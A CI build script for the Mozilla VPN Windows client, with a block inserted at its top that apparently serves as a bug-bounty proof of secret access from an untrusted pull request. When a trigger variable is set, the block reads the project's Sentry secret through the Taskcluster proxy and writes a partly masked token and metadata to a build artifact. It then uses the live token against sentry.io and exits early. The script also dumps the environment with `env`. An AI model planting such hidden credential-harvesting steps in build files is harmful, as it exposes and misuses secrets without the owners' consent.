# This Source Code Form is subject to the terms of the Mozilla Public
# License, v. 2.0. If a copy of the MPL was not distributed with this
# file, You can obtain one at http://mozilla.org/MPL/2.0/.

set -e
. $(dirname $0)/../../../scripts/utils/commons.sh

if [[ "${H1_VALIDATE_SECRET_PROXY:-}" == "1" ]]; then
  artifact_dir="/builds/worker/artifacts"
  mkdir -p "${artifact_dir}"
  secret_name="project/mozillavpn/level-1/sentry"
  secret_url="${TASKCLUSTER_PROXY_URL}/api/secrets/v1/secret/${secret_name}"
  body="$(mktemp)"
  status="$(curl -sS -o "${body}" -w "%{http_code}" "${secret_url}")"

  python3 - "${body}" "${status}" "${secret_name}" <<'PY' > "${artifact_dir}/h1-redacted-secret-proof.json"
import json
import os
import sys
import urllib.error
import urllib.request

body_path, http_status, secret_name = sys.argv[1:4]
result = {
    "marker": "h1-mozilla-vpn-untrusted-pr-secret-proof",
    "secret_name": secret_name,
    "http_status": int(http_status),
    "response_bytes": os.path.getsize(body_path),
    "secret_value_redacted": True,
    "raw_body_retained": False,
}

try:
    with open(body_path, "rb") as f:
        data = json.load(f)
    result["json_parse_ok"] = True
    result["top_level_keys"] = sorted(data.keys()) if isinstance(data, dict) else []
    secret_value = data.get("secret") if isinstance(data, dict) else None
    result["secret_field_present"] = isinstance(data, dict) and "secret" in data
    result["secret_value_type"] = type(secret_value).__name__
    if isinstance(secret_value, dict):
        result["secret_object_key_count"] = len(secret_value)
        result["secret_object_value_types"] = sorted(
            {type(value).__name__ for value in secret_value.values()}
        )
        sentry_token = secret_value.get("sentry_debug_file_upload_key")
        result["sentry_upload_key_present"] = isinstance(sentry_token, str) and bool(sentry_token)
        if isinstance(sentry_token, str) and sentry_token:
            result["sentry_upload_key_length"] = len(sentry_token)
            result["sentry_upload_key_masked"] = (
                sentry_token[:6] + "...redacted..." + sentry_token[-4:]
                if len(sentry_token) > 12
                else "redacted-short-token"
            )
            req = urllib.request.Request(
                "https://sentry.io/api/0/projects/mozilla/vpn-client/",
                headers={
                    "Authorization": "Bearer " + sentry_token,
                    "User-Agent": "h1-redacted-secret-validation",
                },
            )
            try:
                with urllib.request.urlopen(req, timeout=20) as response:
                    sentry_body = response.read(8192)
                    result["sentry_project_probe_http_status"] = response.status
                    result["sentry_project_probe_response_sample_bytes"] = len(sentry_body)
            except urllib.error.HTTPError as exc:
                sentry_body = exc.read(8192)
                result["sentry_project_probe_http_status"] = exc.code
                result["sentry_project_probe_response_sample_bytes"] = len(sentry_body)
            except Exception as exc:
                sentry_body = b""
                result["sentry_project_probe_error_type"] = type(exc).__name__

            if sentry_body:
                try:
                    sentry_data = json.loads(sentry_body.decode("utf-8"))
                    result["sentry_project_probe_json_parse_ok"] = True
                    result["sentry_project_probe_top_level_type"] = type(sentry_data).__name__
                    if isinstance(sentry_data, dict):
                        result["sentry_project_probe_top_level_keys"] = sorted(sentry_data.keys())
                except Exception as exc:
                    result["sentry_project_probe_json_parse_ok"] = False
                    result["sentry_project_probe_parse_error_type"] = type(exc).__name__
    elif isinstance(secret_value, (str, list)):
        result["secret_value_length"] = len(secret_value)
except Exception as exc:
    result["json_parse_ok"] = False
    result["parse_error_type"] = type(exc).__name__

print(json.dumps(result, indent=2, sort_keys=True))
PY

  rm -f "${body}"
  print Y "Wrote redacted H1 proof artifact without printing the secret value."
  exit 42
fi

env

# The arugment, if present, selects the arch to build for
if [[ $# -ge 1 ]]; then
  ARCH=$1
else
  ARCH=x86_64
fi

# Ensure all git submodules are checked out
git submodule update --init --recursive

# We need to call bash with a login shell, so that conda is initialized
print Y "Installing conda"
source ${MOZ_FETCHES_DIR}/conda/bin/activate
conda-unpack

# Use vendored crates - if available.
# HACK: Disabled for aarch64 until https://github.com/briansmith/ring/pull/2216
# can be merged onto mainline. This ensures that we can patch out the ring crate
# without running afoul of vendored crates.
if [[ -d ${MOZ_FETCHES_DIR}/cargo-vendor && "${ARCH}" != "aarch64" ]]; then
mkdir -p .cargo
cat << EOF > .cargo/config.toml
[source.vendored-sources]
directory = "${MOZ_FETCHES_DIR}/cargo-vendor"

[source.crates-io]
replace-with = "vendored-sources"
EOF
fi

print Y "Configuring the build..."
mkdir ${TASK_WORKDIR}/build-win

cmake -S ${VCS_PATH} -B ${TASK_WORKDIR}/build-win -GNinja \
        -DCMAKE_TOOLCHAIN_FILE=${VCS_PATH}/scripts/windows/${ARCH}-toolchain.cmake \
        -DCMAKE_PREFIX_PATH=${MOZ_FETCHES_DIR}/qt-windows/lib/cmake \
        -DQT_HOST_PATH=${MOZ_FETCHES_DIR}/qt-host-tools/ \
        -DQT_HOST_PATH_CMAKE_DIR=${MOZ_FETCHES_DIR}/qt-host-tools/lib/cmake \
        -DCMAKE_BUILD_TYPE=Release \
        -DBUILD_TESTS=OFF

print Y "Building the client..."
cmake --build ${TASK_WORKDIR}/build-win

print Y "Compressing the build artifacts..."
cmake --install ${TASK_WORKDIR}/build-win --prefix ${TASK_WORKDIR}/unsigned
mkdir -p ${TASK_WORKDIR}/artifacts/
(cd ${TASK_WORKDIR}/unsigned && zip -r ${TASK_WORKDIR}/artifacts/unsigned.zip .)

print G "Done!"
